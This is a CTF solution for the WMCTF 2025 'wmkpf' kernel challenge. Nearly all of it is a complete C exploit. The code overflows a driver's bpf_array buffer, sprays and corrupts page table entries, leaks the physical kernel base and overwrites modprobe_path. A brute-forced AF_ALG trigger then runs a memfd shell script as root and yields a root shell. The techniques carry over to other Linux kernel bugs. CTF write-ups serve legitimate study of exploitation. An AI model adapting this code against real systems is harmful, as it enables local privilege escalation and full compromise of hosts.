# WMCTF 2025 wmkpf

Heap Overflow on bpf_array  

The exploit has a success rate of 30%-40%. While there is significant room for improvement, I believe the success rate can be optimized to over 90%. If you're interested, feel free to implement this optimization yourself :)  

```c
// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp

#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <linux/keyctl.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <stddef.h>
#include <sys/utsname.h>
#include <stdbool.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <linux/userfaultfd.h>
#include <sys/socket.h>
#include <asm/ldt.h>
#include <linux/if_packet.h>
#include <linux/bpf.h>
#include <bpf/libbpf.h>
#include <linux/bpf_common.h>
#include <linux/if_alg.h>

size_t buf[0x4000 / 8];

#define MEMCPY_HOST_FD_PATH(buf, pid, fd) sprintf((buf), "/proc/%u/fd/%u", (pid), (fd));

#define IOCTL_WRITE_CMD 0xdeadbeef
#define IOCTL_READ_CMD 0xbeabdeef
#define IOCTL_MAP_INIT 0xdeefbead
#define IOCTL_MAP_DEL 0xbeefdffa

/*
    root@wmbpf:~# cat /proc/cpuinfo
    processor       : 0
    vendor_id       : AuthenticAMD
    cpu family      : 15
    model           : 107
    model name      : QEMU Virtual CPU version 2.5+
    stepping        : 1
    microcode       : 0x1000065
    cpu MHz         : 2687.980
    cache size      : 512 KB
    physical id     : 0
    siblings        : 1
    core id         : 0
    cpu cores       : 1
    apicid          : 0
    initial apicid  : 0
    fpu             : yes
    fpu_exception   : yes
    cpuid level     : 13
    wp              : yes
    flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscallp
    bugs            : fxsave_leak sysret_ss_attrs null_seg swapgs_fence amd_e400 spectre_v1 spectre_v2
    bogomips        : 5375.96
    TLB size        : 1024 4K pages
    clflush size    : 64
    cache_alignment : 64
    address sizes
*/
#define TLB_PAGESPRAY 1024 / 8

#define N_PAGESPRAY 0x200
#define VICTIM_MAP 0x10

void *page_spray[N_PAGESPRAY];
void *tlb_spray[TLB_PAGESPRAY];
int map_fd[VICTIM_MAP];

void err_exit(char *msg){
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}
 
void info(char *msg){
    printf("\033[34m\033[1m[+] %s\n\033[0m", msg);
}
 
void hexx(char *msg, size_t value){
    printf("\033[32m\033[1m[+] %s: %#lx\n\033[0m", msg, value);
}
 
void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

/* bind the process to specific core */
void bind_core(int core){
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status(){
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

int fd;
struct ioctl_param {
    int idx;
    int fd;            
    unsigned int size;  
    void *buf;   
};

int init_cmd(int cmd_fd, int idx){
    struct ioctl_param node;
    node.idx = idx;
    node.fd = cmd_fd;
    ioctl(fd, IOCTL_MAP_INIT, &node);
}

int del_cmd(int idx){
    struct ioctl_param node;
    node.idx = idx;
    ioctl(fd, IOCTL_MAP_DEL, &node);
}

int read_cmd(int idx, int size, void* buf){
    struct ioctl_param node;
    node.idx = idx;
    node.size = size;
    node.buf = buf;
    ioctl(fd, IOCTL_READ_CMD, &node);
}

int write_cmd(int idx, int size, void* buf){
    struct ioctl_param node;
    node.idx = idx;
    node.size = size;
    node.buf = buf;
    ioctl(fd, IOCTL_WRITE_CMD, &node);
}

static inline int bpf(int cmd, union bpf_attr *attr){
    return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

static __always_inline int
bpf_map_create(unsigned int map_type, unsigned int key_size,
               unsigned int value_size, unsigned int max_entries){
    union bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return bpf(BPF_MAP_CREATE, &attr);
}

int create_bpf_array_of_map(int fd, int key_size, int value_size, int max_entries) {
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_ARRAY_OF_MAPS,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
        .inner_map_fd = fd,
    };

    int map_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    if (map_fd < 0) {
        return -1;
    }
    return map_fd;
}

static __always_inline int
bpf_map_lookup_elem(int map_fd, const void* key, void* value){
    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
    };
    return bpf(BPF_MAP_LOOKUP_ELEM, &attr);
}

static __always_inline int
bpf_map_update_elem(int map_fd, const void* key, const void* value, uint64_t flags){
    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = flags,
    };
    return bpf(BPF_MAP_UPDATE_ELEM, &attr);
}

static __always_inline int
bpf_map_delete_elem(int map_fd, const void* key){
    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t)key,
    };
    return bpf(BPF_MAP_DELETE_ELEM, &attr);
}

static __always_inline int
bpf_map_get_next_key(int map_fd, const void* key, void* next_key){
    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t)key,
        .next_key = (uint64_t)next_key,
    };
    return bpf(BPF_MAP_GET_NEXT_KEY, &attr);
}

static __always_inline uint32_t
bpf_map_get_info_by_fd(int map_fd){
    struct bpf_map_info info;
    union bpf_attr attr = {
        .info.bpf_fd = map_fd,
        .info.info_len = sizeof(info),
        .info.info = (uint64_t)&info,
    };
    bpf(BPF_OBJ_GET_INFO_BY_FD, &attr);
    return info.btf_id;
}

#define VALUE_SIZE  0x1000
#define MAP_SPRAY 0x200
int spray_bpf_fd[MAP_SPRAY];
void spray_bpf_map(){
    puts("[*] spray bpf map.");
    uint64_t *value = (uint64_t*)calloc(VALUE_SIZE, 1);
    for(int i = 0; i < MAP_SPRAY; i++){
        spray_bpf_fd[i] = bpf_map_create(BPF_MAP_TYPE_ARRAY, sizeof(int), VALUE_SIZE, 1);
        if (spray_bpf_fd[i] < 0) perror("BPF_MAP_CREATE"), err_exit("BPF_MAP_CREATE");
    }

    free(value);
}

void refresh_tlb(){
    info("refresh tlb...");
    for (int i = 0; i < TLB_PAGESPRAY; i++){
        for (int j = 0; j < 8; j++){
            *(char*)(tlb_spray[i] + j*0x1000) = 'A' + j;
        }   
    }
}

/*
static const struct proto_ops alg_proto_ops = {
    .family         =       PF_ALG,
    .owner          =       THIS_MODULE,
    ...
    .bind           =       alg_bind,
    .release        =       af_alg_release,
    .setsockopt     =       alg_setsockopt,
    .accept         =       alg_accept,
};
static int alg_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len){
    const u32 allowed = CRYPTO_ALG_KERN_DRIVER_ONLY;
    struct sock *sk = sock->sk;
    struct alg_sock *ask = alg_sk(sk);
    struct sockaddr_alg_new *sa = (void *)uaddr;
    const struct af_alg_type *type;
    void *private;
    int err;
    ...
    sa->salg_type[sizeof(sa->salg_type) - 1] = 0;
    sa->salg_name[addr_len - sizeof(*sa) - 1] = 0;
    type = alg_get_type(sa->salg_type);   
    if (PTR_ERR(type) == -ENOENT) {
        request_module("algif-%s", sa->salg_type);   
        type = alg_get_type(sa->salg_type);
}
*/
static void trigger_modprobe(){
    struct sockaddr_alg sa;

    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) {
        perror("socket(AF_ALG) failed");
        return ;
    }

    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "Qanux");  // dummy string
    bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
}

int main(){
    int shm_id, tmp_fd;
    int shell_stdin_fd;
    int shell_stdout_fd;
    int sync_pipe[0x10][2];
    FILE *file;
    const char *filename = "/tmp/sh";

    file = fopen(filename, "w");
    if (file == NULL) {
        perror("Error opening file");
        return 1;
    }
    fclose(file);

    bind_core(0);
    save_status();

    fd = open("/dev/vuln",O_RDWR);
    if (fd < 0){
        err_exit("open device failed!");
    }

    info("Prepare pages for PTE");
    for (int i = 0; i < N_PAGESPRAY; i++) {
        page_spray[i] = mmap((void*)(0xdead0000UL + i*0x10000UL),
                            0x8000, PROT_READ|PROT_WRITE,
                            MAP_ANONYMOUS|MAP_SHARED, -1, 0);
        if (page_spray[i] == MAP_FAILED) err_exit("mmap");
    }

    info("Prepare pages for refresh tlb");
    for (int i = 0; i < TLB_PAGESPRAY; i++) {
        tlb_spray[i] = mmap((void*)(0xdead0000UL + i*0x10000UL),
                            0x8000, PROT_READ|PROT_WRITE,
                            MAP_ANONYMOUS|MAP_SHARED, -1, 0);
        if (tlb_spray[i] == MAP_FAILED) err_exit("mmap");
    }

    refresh_tlb();
    spray_bpf_map();

    for(int i = 0; i < (0x4000 / 8); i++){
        buf[i] = 0x800000000009c067;
    }

    puts("[*] Init map list(1)");
    for(int i = 0; i < VICTIM_MAP / 2; i++){
        map_fd[i] = bpf_map_create(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x1000, 1);
        if (map_fd[i] < 0) perror("BPF_MAP_CREATE"), err_exit("BPF_MAP_CREATE");

        init_cmd(map_fd[i], i);
    }

    puts("[*] Allocating PTEs...");
    info("Allocate many PTEs (1)");
    for (int i = 0; i < N_PAGESPRAY/2; i++){
        for (int j = 0; j < 8; j++){
            *(char*)(page_spray[i] + j*0x1000) = 'A' + j;
        }   
    }

    puts("[*] Init map list(2)");
    for(int i = VICTIM_MAP / 2; i < VICTIM_MAP; i++){
        map_fd[i] = bpf_map_create(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x1000, 1);
        if (map_fd[i] < 0) perror("BPF_MAP_CREATE"), err_exit("BPF_MAP_CREATE");

        init_cmd(map_fd[i], i);
    }

    info("Allocate many PTEs (2)");
    for (int i = N_PAGESPRAY/2; i < N_PAGESPRAY; i++){
        for (int j = 0; j < 8; j++){
            *(char*)(page_spray[i] + j*0x1000) = 'A' + j;
        }   
    }

    puts("[*] tigger bpf map overflow");
    for(int i = 0; i < VICTIM_MAP; i++){
        write_cmd(i, 0x1000, buf);
    }

    refresh_tlb();

    puts("[+] Searching for overlapping page...");
    // Leak kernel physical base
    void *wwwbuf = NULL;
    for (int i = 0; i < N_PAGESPRAY; i++) {
        if (*(size_t*)page_spray[i] > 0xffff) {
            wwwbuf = page_spray[i];
            printf("[+] Found victim page table: %p\n", wwwbuf);
            break;
        }
    }

    if (wwwbuf == NULL) err_exit("target not found :(");

    printf("[+] wwwbuf data: %p \n", ((*(size_t*)wwwbuf)));

    size_t phys_base = ((*(size_t*)wwwbuf) & ~0xfff) - 0x3e04000;
    printf("[+] Physical kernel base address: 0x%016lx\n", phys_base);

    /**
     * Overwrite mdoprobe
     */

    size_t modprobe_patch = phys_base + 0x2d64180;

    for(int i = 0; i < (0x4000 / 8); i++){
        buf[i] = (modprobe_patch & ~0xfff) | 0x8000000000000067;;
    }

    for(int i = 0; i < VICTIM_MAP; i++){
        write_cmd(i, 0x1000, buf);
    }

    refresh_tlb();

    // open copies of stdout etc which will not be redirected when stdout is redirected, but will be printed to user
    shell_stdin_fd = dup(STDIN_FILENO);
    shell_stdout_fd = dup(STDOUT_FILENO);

    // run this script instead of /sbin/modprobe
    int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
    int status_fd = memfd_create("", 0);
    printf("[*] modprobe_script_fd: %d, status_fd: %d\n", modprobe_script_fd, status_fd);

    void *pmd_modprobe_addr = (void *)wwwbuf + 0x180;

    for (pid_t pid_guess=0; pid_guess < 4194304; pid_guess++){
        int status_cnt;
        char status_buf;

        lseek(modprobe_script_fd, 0, SEEK_SET); // overwrite previous entry
        dprintf(modprobe_script_fd, "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n", pid_guess, status_fd, pid_guess, shell_stdin_fd, pid_guess, shell_stdout_fd);

        // overwrite the `modprobe_path` kernel variable to "/proc/<pid>/fd/<script_fd>"
        // - use /proc/<pid>/* since container path may differ, may not be accessible, et cetera
        // - it must be root namespace PIDs, and can't get the root ns pid from within other namespace
        MEMCPY_HOST_FD_PATH(pmd_modprobe_addr, pid_guess, modprobe_script_fd);

        if (pid_guess % 50 == 0){
            printf("[+] overwriting modprobe_path with different PIDs (%u-%u)...\n", pid_guess, pid_guess + 50);
            printf("    - i.e. '%s' @ %p...\n", (char*)pmd_modprobe_addr, pmd_modprobe_addr);
        }
            
        lseek(modprobe_script_fd, 0, SEEK_SET); // overwrite previous entry
        dprintf(modprobe_script_fd, "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n", pid_guess, status_fd, pid_guess, shell_stdin_fd, pid_guess, shell_stdout_fd);

        // run custom modprobe file as root, by triggering it by executing file with unknown binfmt
        // if the PID is incorrect, nothing will happen
        trigger_modprobe();

        // indicates correct PID (and root shell). stops further bruteforcing
        status_cnt = read(status_fd, &status_buf, 1);
        if (status_cnt == 0)
            continue;

        printf("[+] successfully breached the mainframe as real-PID %u\n", pid_guess);

        goto pwn;
    }

    printf("[-] Lose...\n");
    exit(0);
pwn:

    puts("[+] EXP END.");
    return 0;
}
```

![[root.mp4]]